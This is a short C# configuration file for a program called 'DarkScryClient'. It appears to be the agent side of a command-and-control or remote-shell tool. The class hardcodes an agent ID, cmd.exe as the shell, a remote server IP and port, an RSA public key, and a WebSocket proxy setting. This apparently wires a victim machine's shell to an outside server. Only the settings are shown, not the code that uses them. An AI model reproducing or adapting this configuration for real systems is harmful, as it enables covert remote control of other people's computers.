﻿

namespace DarkScryClient
{
	enum ProxyKindOptions
	{
		WebSocketBrowser = 0,
	}
	internal class Config
	{
		public static string agent_id = "60a7105e-3445-4ce3-a672-8cc6756dccb1";
		public static string MainShell = "cmd.exe";
		public static bool IsMainShellRuning = false;
		public static string ServerIp = "172.236.98.55";
		public static int RemotePort = 1234;
		public static readonly string PublicKey = "<RSAKeyValue>\r\n    <Modulus>p/cnfgm2H5B5OZoPf5yoCnctDc7N70ZOg4LgXOHLAMoH/rnJCQfFho4ZZz4uHhS8LOT0GnvkhHmr5KlovjvtURMCRk8nTdFMxEyJHp/BX8Zl2RXV/pFROkLMaaJ+DXnKv8cpmda+kpb3GoQWlhPvE5q9dj9SZMsLJx4qfO49KQF633mAySuR8vyXe0PkbaDMO15Asza3ReE19w7bVB0CfNWC+Z8FTZEQiWhq2Fd96nkeD1eYA7g3/XqnU/nvlf5JoP9Ezhw9CrTtZkqe1s16N8onuT8SHoxUDOG4ED5ymOgsogdF7r98UxQ9zjKYZNKLQ36UgSs6S8YGlkptV6Wiuw==</Modulus>\r\n    <Exponent>AQAB</Exponent>\r\n</RSAKeyValue>";
		public static readonly string AgentName = "DarkScry Cleint";
		public static readonly string AgnetVersion = "1.0.0";

		public static readonly bool UseProxy = true;
		public static string ProxyHost = "localhost";
		public static readonly ProxyKindOptions ProxyKind = ProxyKindOptions.WebSocketBrowser;
	}
}
